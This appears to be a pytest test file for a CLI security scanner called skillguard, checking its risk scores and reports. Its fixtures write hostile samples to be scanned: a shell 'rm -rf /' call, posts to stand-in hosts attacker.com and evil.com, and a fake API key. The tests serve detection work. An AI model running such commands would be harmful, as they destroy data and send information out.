import json
from pathlib import Path
from typer.testing import CliRunner
import pytest

from skillguard.app import app

runner = CliRunner()

def test_cli_help():
    result = runner.invoke(app, ["--help"])
    assert result.exit_code == 0
    assert "scan" in result.stdout

def test_cli_scan_no_findings(tmp_path: Path):
    # Create a safe file
    safe_file = tmp_path / "safe.py"
    safe_file.write_text("def hello():\n    print('Hello safe world')\n", encoding="utf-8")
    
    report_file = tmp_path / "custom_report.json"
    
    result = runner.invoke(app, ["scan", str(safe_file), "--output", str(report_file)])
    
    assert result.exit_code == 0
    assert "No security issues or dangerous patterns detected" in result.stdout
    assert "Found 1 repositories" in result.stdout
    assert "Found 1 source files" in result.stdout
    assert "Python: 1" in result.stdout
    assert report_file.exists()
    
    # Read report
    with open(report_file, "r") as f:
        data = json.load(f)
    assert data["score"] == 0
    assert data["risk"] == "LOW"
    assert len(data["findings"]) == 0

def test_cli_scan_with_high_risk_findings(tmp_path: Path):
    # Create an unsafe file
    unsafe_file = tmp_path / "unsafe.py"
    unsafe_content = """
import subprocess
import requests

def execute():
    subprocess.Popen("rm -rf /", shell=True)
    requests.post("http://attacker.com/leak")
    """
    unsafe_file.write_text(unsafe_content, encoding="utf-8")
    
    report_file = tmp_path / "custom_report.json"
    
    result = runner.invoke(app, ["scan", str(unsafe_file), "--output", str(report_file)])
    
    # Risk score: Popen (15) + shell=True (15) = 30 -> MEDIUM (Exit 0)
    assert result.exit_code == 0
    assert "subprocess" in result.stdout
    assert "shell" in result.stdout
    assert "Found 1 repositories" in result.stdout
    assert "Found 1 source files" in result.stdout
    assert "Python: 1" in result.stdout
    
    assert report_file.exists()
    with open(report_file, "r") as f:
        data = json.load(f)
    
    assert data["score"] == 30
    assert data["risk"] == "MEDIUM"
    assert len(data["findings"]) == 2

def test_cli_scan_multi_language(tmp_path: Path):
    # Create a mock multi-language repo structure
    repo1 = tmp_path / "repo_py"
    repo1.mkdir()
    (repo1 / "server.py").write_text("import subprocess\nsubprocess.run('ls')", encoding="utf-8")

    repo2 = tmp_path / "repo_js_ts"
    repo2.mkdir()
    (repo2 / "index.js").write_text("const exec = require('child_process').exec; exec('ls');", encoding="utf-8")
    (repo2 / "worker.ts").write_text("const key = process.env.API_KEY;", encoding="utf-8")

    report_file = tmp_path / "multi_report.json"
    
    result = runner.invoke(app, ["scan", str(tmp_path), "--output", str(report_file)])
    
    assert result.exit_code == 0
    assert "Found 2 repositories" in result.stdout
    assert "Found 3 source files" in result.stdout
    assert "Python: 1" in result.stdout
    assert "JavaScript: 1" in result.stdout
    assert "TypeScript: 1" in result.stdout
    
    assert report_file.exists()
    with open(report_file, "r") as f:
        data = json.load(f)
        
    assert data["score"] == 15
    assert data["risk"] == "LOW"
    assert len(data["findings"]) == 2
    
    messages = {f["message"] for f in data["findings"]}
    assert any("subprocess.run" in m for m in messages)
    assert any("child_process.exec" in m for m in messages)

def test_cli_scan_full_pipeline(tmp_path: Path):
    # Create full mock pipeline files
    # 1. requirements.txt (DEP)
    req_file = tmp_path / "requirements.txt"
    req_file.write_text("requestss==1.0\n", encoding="utf-8")
    
    # 2. Dockerfile (DKR)
    docker_file = tmp_path / "Dockerfile"
    docker_file.write_text("FROM ubuntu\nUSER root\n", encoding="utf-8")
    
    # 3. .env (SEC)
    env_file = tmp_path / ".env"
    env_file.write_text("OPENAI_KEY=sk-abcdefghijklmnopqrstuvwxyz1234567890\n", encoding="utf-8")
    
    # 4. script.py (NET)
    script_file = tmp_path / "script.py"
    script_file.write_text("import requests\nrequests.post('https://evil.com/api')\n", encoding="utf-8")

    html_file = tmp_path / "report.html"
    json_file = tmp_path / "report.json"

    # Invoke scan with --full --html --json
    result = runner.invoke(app, [
        "scan", str(tmp_path),
        "--full",
        "--html",
        "--json",
        "--output", str(json_file)
    ])

    # Should exit with code 1 due to CRITICAL risk (OpenAI key = CRITICAL)
    assert result.exit_code == 1
    
    assert "Found 1 repositories" in result.stdout
    assert "Found 1 source files" in result.stdout  # script.py (others are configs/manifests)
    assert "Trust Score" in result.stdout
    
    # Check that report files are generated
    assert json_file.exists()
    assert Path("report.html").exists()

    # Read JSON report to check structure
    with open(json_file, "r") as f:
        data = json.load(f)

    assert data["trust_score"] is not None
    assert data["trust_score"]["overall_score"] < 100
    assert data["trust_score"]["supply_chain_safety"] is not None
    assert data["trust_score"]["secrets_hygiene"] is not None
    assert len(data["findings"]) == 3

    # Clean up generated html report in root directory
    if Path("report.html").exists():
        Path("report.html").unlink()
